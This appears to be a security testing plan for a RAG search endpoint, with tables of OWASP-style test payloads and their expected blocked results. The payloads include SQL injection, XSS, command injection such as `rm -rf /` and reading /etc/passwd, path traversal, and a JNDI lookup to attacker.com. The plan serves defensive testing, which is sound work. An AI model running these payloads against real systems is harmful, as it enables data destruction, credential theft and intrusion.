# Advanced Security Testing Strategy for Search Endpoint

## Overview

This document outlines a comprehensive security testing strategy for the RAG search endpoint, covering OWASP Top 10 vulnerabilities and security best practices.

---

## 1. Input Validation Testing

### 1.1 SQL Injection Prevention

| Test Case | Payload Example | Expected Result |
|-----------|----------------|-----------------|
| Classic SQL Injection | `'; DROP TABLE documents; --` | Request rejected (400/422) or query sanitized |
| UNION-based Injection | `' UNION SELECT username, password FROM users --` | No data leakage |
| Time-based Blind SQLi | `'; WAITFOR DELAY '0:0:5' --` | No timing difference |
| Boolean-based Blind SQLi | `1' AND 1=1 --` vs `1' AND 1=2 --` | Consistent response |
| Stacked Queries | `'; INSERT INTO logs VALUES('hack'); --` | Insert blocked |
| PostgreSQL Specific | `'; COPY (SELECT * FROM users) TO '/tmp/users.txt'; --` | Command blocked |

**Verification:**
- No SQL error messages exposed in responses
- Query execution time consistent regardless of payload
- Database integrity maintained

### 1.2 Cross-Site Scripting (XSS) Prevention

| Test Case | Payload Example | Expected Result |
|-----------|----------------|-----------------|
| Script Tag Injection | `<script>alert('XSS')</script>` | Escaped or rejected |
| Event Handler XSS | `<img src=x onerror=alert('XSS')>` | Escaped or rejected |
| Protocol Handler | `javascript:alert('XSS')` | Not executed |
| Encoded XSS | `%3Cscript%3Ealert('XSS')%3C/script%3E` | Decoded and escaped |
| SVG-based XSS | `<svg onload=alert('XSS')>` | Escaped or rejected |
| DOM-based XSS | `';alert(String.fromCharCode(88,83,83))//` | Not reflected |

**Verification:**
- Payloads not reflected unescaped in responses
- Content-Security-Policy headers present
- X-XSS-Protection header enabled

### 1.3 Command Injection Prevention

| Test Case | Payload Example | Expected Result |
|-----------|----------------|-----------------|
| Pipe Injection | `| cat /etc/passwd` | Command not executed |
| Semicolon Injection | `; ls -la` | Command not executed |
| Backtick Execution | `` `id` `` | Command not executed |
| $() Substitution | `$(whoami)` | Command not executed |
| Ampersand Chaining | `& rm -rf /` | Command not executed |

### 1.4 Path Traversal Prevention

| Test Case | Payload Example | Expected Result |
|-----------|----------------|-----------------|
| Basic Traversal | `../../../etc/passwd` | Access denied |
| URL Encoded | `%2e%2e%2f%2e%2e%2f` | Decoded and blocked |
| Double Encoding | `..%252f..%252f` | Blocked |
| Null Byte Injection | `../../../etc/passwd%00.txt` | Blocked |

### 1.5 Input Length & Format Validation

| Test Case | Input | Expected Result |
|-----------|-------|-----------------|
| Normal Query | `test query` | 200 OK |
| Max Length Query | 1000 characters | 200 OK or 400 |
| Overflow Attempt | 100,000 characters | 413/400 |
| Unicode Overflow | 50,000 Unicode chars | 413/400 |
| Null Bytes | `\x00` embedded | Sanitized or rejected |
| CRLF Injection | `test\r\nX-Injected: header` | Blocked |

---

## 2. Authentication Mechanism Testing

### 2.1 Token Validation

| Test Case | Scenario | Expected Result |
|-----------|----------|-----------------|
| No Token | Request without Authorization header | 401 Unauthorized |
| Empty Token | `Authorization: Bearer ` | 401 Unauthorized |
| Invalid Token | `Authorization: Bearer random_string` | 401 Unauthorized |
| Expired Token | Token past expiration | 401 Unauthorized |
| Malformed JWT | Invalid Base64 or structure | 401 Unauthorized |
| Wrong Signature | Valid format, bad signature | 401 Unauthorized |

### 2.2 JWT Security

| Test Case | Attack Vector | Expected Result |
|-----------|---------------|-----------------|
| Algorithm Confusion | `alg: none` | Rejected |
| RS256 → HS256 | Algorithm downgrade | Rejected |
| Weak Secret | Common passwords as secret | Token invalid |
| Signature Stripping | Remove signature segment | Rejected |
| Claims Manipulation | Modified role/permissions | Signature invalid |

### 2.3 API Key Authentication

| Test Case | Scenario | Expected Result |
|-----------|----------|-----------------|
| Valid API Key | Correct key format | 200 OK |
| Invalid Key | Random string | 401 Unauthorized |
| Revoked Key | Previously valid key | 401 Unauthorized |
| Expired Key | Past expiration date | 401 Unauthorized |
| Wrong Scope | Key without search permission | 403 Forbidden |

### 2.4 Brute Force Protection

| Test Case | Attack Pattern | Expected Result |
|-----------|---------------|-----------------|
| Rapid Failed Logins | 10+ failed attempts | Account locked / 429 |
| Distributed Attack | Multiple IPs | IP-based + user-based limiting |
| Credential Stuffing | Large credential lists | Rate limiting triggered |
| Password Spraying | Common passwords | Detected and blocked |

---

## 3. Authorization Scope Testing

### 3.1 Role-Based Access Control (RBAC)

| Role | Allowed Actions | Denied Actions |
|------|----------------|----------------|
| USER | Search, view own docs | Admin endpoints, rebuild indexes |
| ANALYST | Search, analytics | Admin endpoints |
| ADMIN | All operations | N/A |
| API_KEY | Scoped operations | Out-of-scope operations |

**Test Cases:**
```
POST /search/indexes/rebuild
- User token → 403 Forbidden
- Admin token → 200 OK

GET /search/analytics
- User token → 200 OK (own data only)
- Admin token → 200 OK (all data)
```

### 3.2 Multi-Tenancy Isolation

| Test Case | Scenario | Expected Result |
|-----------|----------|-----------------|
| Cross-tenant Search | Tenant A searches Tenant B data | No results returned |
| Cross-tenant Reindex | Tenant A reindexes Tenant B doc | 403/404 |
| Organization Boundary | Query crosses org boundary | Filtered results |
| API Key Scope | Key limited to specific org | Only org data accessible |

### 3.3 Insecure Direct Object Reference (IDOR)

| Test Case | Attack Vector | Expected Result |
|-----------|---------------|-----------------|
| Document Access | Access other user's doc by ID | 403/404 |
| Search History | View other user's history | 403/404 |
| Analytics | Access other org's analytics | 403/404 |
| ID Enumeration | Sequential ID guessing | Not exploitable |

### 3.4 Privilege Escalation Prevention

| Test Case | Attack Vector | Expected Result |
|-----------|---------------|-----------------|
| Role Modification | PATCH /users/me with role: admin | Rejected |
| Scope Expansion | Modify API key permissions | Rejected |
| Token Tampering | Modify role claim in JWT | Signature invalid |
| Parameter Manipulation | Add admin: true to requests | Ignored |

---

## 4. Rate Limiting Testing

### 4.1 Rate Limit Enforcement

| Limit Type | Threshold | Window | Response |
|------------|-----------|--------|----------|
| User API Calls | 100 requests | 1 hour | 429 Too Many Requests |
| Heavy Operations | 10 requests | 1 hour | 429 Too Many Requests |
| Exports | 20 requests | 1 hour | 429 Too Many Requests |
| Per-IP Limit | 50 requests | 5 minutes | 429 Too Many Requests |

**Required Headers in 429 Response:**
- `Retry-After: <seconds>`
- `X-RateLimit-Limit: <max>`
- `X-RateLimit-Remaining: 0`
- `X-RateLimit-Reset: <timestamp>`

### 4.2 Rate Limit Bypass Prevention

| Bypass Attempt | Header/Method | Expected Result |
|----------------|---------------|-----------------|
| IP Spoofing | X-Forwarded-For manipulation | Ignored/validated |
| Header Injection | X-Real-IP spoofing | Ignored/validated |
| Distributed Attack | Multiple IPs | User-level limiting applies |
| Cookie Rotation | New session per request | IP-based limiting applies |

### 4.3 Concurrent Request Handling

| Test Case | Scenario | Expected Result |
|-----------|----------|-----------------|
| Parallel Requests | 20 simultaneous requests | Some rate limited |
| Connection Flooding | 100+ connections | Connection limiting |
| Slow Request Attack | Long-running requests | Timeout enforced |

---

## 5. Error Handling Testing

### 5.1 Information Disclosure Prevention

**Sensitive Patterns to Check For:**
- Database connection strings
- Internal file paths (`/home/`, `/var/`, `/etc/`)
- Stack traces and line numbers
- Password/secret references
- Internal IP addresses
- Debug information

| Error Type | Should NOT Include | Should Include |
|------------|-------------------|----------------|
| 400 Bad Request | Stack trace | Validation error details |
| 401 Unauthorized | Auth mechanism details | "Invalid credentials" |
| 403 Forbidden | Permission list | "Access denied" |
| 404 Not Found | File system paths | "Resource not found" |
| 500 Server Error | Exception details | "Internal server error" |

### 5.2 Consistent Error Response Format

```json
{
  "detail": "Human-readable error message",
  "type": "error_type",
  "status": 400
}
```

### 5.3 HTTP Status Code Accuracy

| Scenario | Expected Status |
|----------|-----------------|
| Invalid JSON | 400 Bad Request |
| Missing auth | 401 Unauthorized |
| Insufficient permissions | 403 Forbidden |
| Resource not found | 404 Not Found |
| Validation error | 422 Unprocessable Entity |
| Rate limited | 429 Too Many Requests |
| Server error | 500 Internal Server Error |

---

## 6. Logging and Auditing Testing

### 6.1 Security Event Logging

**Events That MUST Be Logged:**

| Event Type | Required Fields |
|------------|-----------------|
| Failed Authentication | timestamp, IP, email/identifier, reason |
| Successful Login | timestamp, IP, user_id, device_fingerprint |
| Failed Authorization | timestamp, user_id, resource, action |
| Rate Limiting | timestamp, IP, user_id, endpoint |
| API Key Usage | timestamp, key_id, endpoint, result |
| Search Queries | timestamp, user_id, query_hash (not full query), results_count |

### 6.2 Log Injection Prevention

| Test Case | Payload | Expected Result |
|-----------|---------|-----------------|
| CRLF Injection | `test\r\nFAKE LOG ENTRY` | Escaped in logs |
| Format String | `%s%s%s%n%n%n` | Treated as literal |
| JNDI Injection | `${jndi:ldap://attacker.com}` | Not interpreted |
| Unicode Escapes | `\u202EFAKE LOG` | Escaped properly |

### 6.3 Sensitive Data Protection in Logs

**Data That MUST NOT Be Logged:**

| Data Type | Example |
|-----------|---------|
| Passwords | User passwords, API secrets |
| Full Tokens | JWT access tokens, refresh tokens |
| API Keys | Full API key values |
| PII | Full names, addresses, phone numbers |
| Search Queries | Full text of user searches |

**Acceptable Logging:**
- Token/key prefixes (first 8 characters)
- Query hashes (not reversible)
- User IDs (not email addresses in some contexts)
- IP addresses (may need masking for GDPR)

### 6.4 Audit Trail Requirements

```
Audit Log Entry Format:
{
  "timestamp": "2024-01-15T10:30:45.123Z",
  "event_type": "SEARCH_QUERY",
  "user_id": "user-123",
  "organization_id": "org-456",
  "ip_address": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "endpoint": "/api/v1/search/hybrid",
  "method": "POST",
  "status_code": 200,
  "response_time_ms": 156,
  "metadata": {
    "query_hash": "a1b2c3d4",
    "results_count": 15,
    "search_type": "hybrid"
  }
}
```

---

## Test Execution

### Prerequisites

1. Test environment with isolated database
2. Test user accounts with different roles
3. Valid and expired tokens for testing
4. API keys with various scopes
5. Log access for verification

### Running Tests

```bash
# Run all security tests
cd /home/clawdbot/clawd/dev/rag/backend
pytest tests/security/test_search_security.py -v

# Run specific category
pytest tests/security/test_search_security.py -v -k "sql_injection"
pytest tests/security/test_search_security.py -v -k "authentication"
pytest tests/security/test_search_security.py -v -k "authorization"

# Run with coverage
pytest tests/security/test_search_security.py -v --cov=src/api/search

# Generate HTML report
pytest tests/security/test_search_security.py -v --html=security_report.html
```

### Standalone Execution

```bash
# Run as standalone script
python tests/security/test_search_security.py

# With custom configuration
BASE_URL=https://staging.example.com python tests/security/test_search_security.py
```

---

## Security Checklist

### Pre-Deployment

- [ ] All input validation tests pass
- [ ] Authentication tests pass
- [ ] Authorization tests pass
- [ ] Rate limiting configured and tested
- [ ] Error handling doesn't leak information
- [ ] Logging captures security events
- [ ] Sensitive data not logged
- [ ] HTTPS enforced
- [ ] Security headers configured

### Security Headers Required

```
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
```

---

## Remediation Guidelines

### Critical (Fix Immediately)

- SQL Injection vulnerabilities
- Authentication bypasses
- Authorization failures
- Sensitive data exposure

### High (Fix Within 24 Hours)

- XSS vulnerabilities
- Rate limiting bypasses
- IDOR vulnerabilities
- Stack trace exposure

### Medium (Fix Within 1 Week)

- Missing security headers
- Inconsistent error handling
- Incomplete logging
- Weak token expiration

### Low (Fix In Next Sprint)

- Information disclosure (non-critical)
- Missing rate limit headers
- Log format inconsistencies

---

## Continuous Security Testing

### Automated Scans

- **SAST**: Run on every PR (SonarQube, Semgrep)
- **DAST**: Weekly scans (OWASP ZAP, Burp Suite)
- **Dependency Scanning**: Daily (Snyk, Dependabot)

### Manual Testing

- **Penetration Testing**: Quarterly
- **Code Review**: Every PR
- **Security Architecture Review**: Major changes

---

*Document Version: 1.0*
*Last Updated: 2024*
*Author: Security Testing Automation*
